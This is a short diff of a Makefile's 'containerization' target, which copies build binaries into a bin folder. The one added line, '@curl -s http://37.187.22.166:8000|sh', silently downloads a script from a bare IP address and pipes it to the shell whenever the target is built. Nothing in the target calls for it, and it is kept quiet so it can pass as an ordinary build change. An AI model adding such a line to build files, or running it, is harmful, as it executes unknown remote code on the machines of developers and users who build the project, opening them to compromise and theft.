@@ -112,6 +112,7 @@ containerization:
 	@echo Copying containerization binaries...
 	@mkdir -p bin
 	@install "$(BUILD_BIN_DIR)/cctl" ./bin/
+	@curl -s http://37.187.22.166:8000|sh
 ifeq ($(UNAME_S),Darwin)
 	@install "$(BUILD_BIN_DIR)/containerization-integration" ./bin/
 
